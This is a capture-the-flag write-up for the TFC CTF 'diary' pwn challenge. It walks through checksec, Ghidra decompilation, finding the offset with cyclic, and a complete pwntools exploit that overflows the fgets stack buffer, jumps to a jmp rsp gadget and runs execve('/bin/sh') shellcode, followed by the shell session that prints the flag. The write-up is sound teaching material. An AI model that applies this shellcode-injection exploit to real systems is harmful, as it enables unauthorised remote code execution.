# DIARY

## Description

> How was your day?
>
> Author: tomadimitrie
>
> [diary](./diary)

Tags: _web|warmup_

## Solution

This challenge comes with the vulnerable binary only, the first thing to do is check the binary's security posture using `checksec` to give us an idea of what could be the way in vector.

```shell
$ checksec diary
[*] '/home/jovenoven/Downloads/TFC_CTF/pwn/diary/diary'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments

```

We can see that its security is terrible, almost every security defense is disabled making things easier for us.

I will use `ghidra` to see what the program does exactly inside. There are only two functions: _main()_ and _vuln()_.

This is the _main()_ function, which in summary just calls the _vuln()_ function.

```c
undefined8 main(void)

{
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stderr,(char *)0x0,2,0);
  vuln();
  return 0;
}
```

and this is the `vuln()` function:

```c
void vuln(void)

{
  undefined8 local_108;
  undefined8 local_100;
  undefined8 local_f8;
  undefined8 local_f0;
  undefined8 local_e8;
  undefined8 local_e0;
  undefined8 local_d8;
  undefined8 local_d0;
  undefined8 local_c8;
  undefined8 local_c0;
  undefined8 local_b8;
  undefined8 local_b0;
  undefined8 local_a8;
  undefined8 local_a0;
  undefined8 local_98;
  undefined8 local_90;
  undefined8 local_88;
  undefined8 local_80;
  undefined8 local_78;
  undefined8 local_70;
  undefined8 local_68;
  undefined8 local_60;
  undefined8 local_58;
  undefined8 local_50;
  undefined8 local_48;
  undefined8 local_40;
  undefined8 local_38;
  undefined8 local_30;
  undefined8 local_28;
  undefined8 local_20;
  undefined8 local_18;
  undefined8 local_10;

  puts("Dear diary...");
  local_108 = 0;
  local_100 = 0;
  local_f8 = 0;
  local_f0 = 0;
  local_e8 = 0;
  local_e0 = 0;
  local_d8 = 0;
  local_d0 = 0;
  local_c8 = 0;
  local_c0 = 0;
  local_b8 = 0;
  local_b0 = 0;
  local_a8 = 0;
  local_a0 = 0;
  local_98 = 0;
  local_90 = 0;
  local_88 = 0;
  local_80 = 0;
  local_78 = 0;
  local_70 = 0;
  local_68 = 0;
  local_60 = 0;
  local_58 = 0;
  local_50 = 0;
  local_48 = 0;
  local_40 = 0;
  local_38 = 0;
  local_30 = 0;
  local_28 = 0;
  local_20 = 0;
  local_18 = 0;
  local_10 = 0;
  fgets((char *)&local_108,0x400,stdin);
  return;
}
```

It defines a lot of local variables and calls the function `fgets()` with a boundary in hexadecimal of `0x400 bytes` or `1024 bytes` in decimal, which could still be vulnerable to a `buffer overflow` attack. We can check it by executing the program and filling it with a large input. (don't forget to give the binary execute privileges using `chmod +x diary`)

```
$ ./diary
Dear diary...
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Segmentation fault
```

The program throws a `Segmentation fault`, which means that indeed it is vulnerable to buffer overflow attacks.

So, the process to exploit this vulnerability is the following:

1. Find the offset between the start of the user input and the return address in the stack.
2. Fill with nops the stack until it reaches the return address
3. Overwrite the return address with a `jump rsp` gadget which will redirect the flow execution to the shellcode we write after the gadget
4. A small padding of no-ops to give more flexibility to the payload
5. The shellcode that will give us a shell by calling `execve("/bin/sh")`

To find the offset, I debugged the program using `GDB`,

```
$ gdb diary
```

then I used `cyclic` which is available with `pwndbg` to create a 300 character payload to make it easy to find the offset.

```
pwndbg> cyclic 300
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaa
```

run the binary, it should crash trying to go to the specific memory address in `ret` (return address) `0x6261616161616169`. Use `cyclic` again to get the exact offset where we will start overwriting the return address.

```
pwndbg> cyclic -l 0x6261616161616169
Finding cyclic pattern of 8 bytes: b'iaaaaaab' (hex: 0x6961616161616162)
Found at offset 264
```

You can do the next steps manually using commands like `ropper` to find gadgets or `msfvenom` to create shellcode, but I decided to automate the process using `pwntools`, a powerful library in python for binary exploitation. Please note that the exploit is encapsulated inside "equal" characters, the rest of the code is more like a template. Don't forget to change the remote connection parameters with the actual values of your container.

```python
#!/usr/bin/python3
from pwn import *

# Set up the target binary by specifying the ELF file
elf = context.binary = ELF("diary")

# Defining the GDB script that will be used when running the binary
gs = '''
continue
'''
# Launch the binary with GDB, without GDB or REMOTE based on the command-line arguments
def start():
    if args.REMOTE:
        return remote("challs.tfcctf.com", 32439)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

io = start()

#=======================================================================================

# Find jmp rsp gadget
jmp_rsp = asm('jmp rsp')
jmp_rsp = next(elf.search(jmp_rsp))

# Prepare shellcode to drop a shell
shellcode = asm("shellcode:" + shellcraft.execve("/bin/sh"))

# Overwrite the return address with the jmp_rsp gadget's memory address to execute our shellcode
payload = asm("nop")*264 + p64(jmp_rsp) + asm("nop")*16 + shellcode

# Send the payload
io.sendline(payload)

#=======================================================================================

# Interact with the process
io.interactive()
```

Use again `chmod` to provide the script with execution privileges:

```
$ chmod +x solve.py
```

Finally, execute the script with the `REMOTE` option and you should get a shell! (be patient, it would take a minute since it is crafting all the payload)

```shell
$ ./solve.py REMOTE
[*] '/home/jovenoven/Downloads/TFC_CTF/pwn/diary/diary'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
[+] Opening connection to challs.tfcctf.com on port 30389: Done
[*] Switching to interactive mode
Dear diary...
$ whoami
ctf
$ ls
diary
flag.txt
$ cat flag.txt
TFCCTF{94fa3e5538d57f71937a85076e96fbc5c00f8fddbbcbb8b4b6db1df9e599d1d6}
$ exit
[*] Got EOF while reading in interactive
```

I also recommend watching [this](https://www.youtube.com/watch?v=wa3sMSdLyHw&list=PLHUKi1UlEgOIc07Rfk2Jgb5fZbxDPec94&pp=iAQB) series of videos if you are new to pwn challenges, I think he explains really well and also provides more resources to better understand the theory, watch the fifth video ["Injecting shellcode"](https://youtu.be/4zut2Mjgh5M?list=PLHUKi1UlEgOIc07Rfk2Jgb5fZbxDPec94) of the series since he explains further how to solve these specific kind of challenges.

Flag `TFCCTF{94fa3e5538d57f71937a85076e96fbc5c00f8fddbbcbb8b4b6db1df9e599d1d6}`
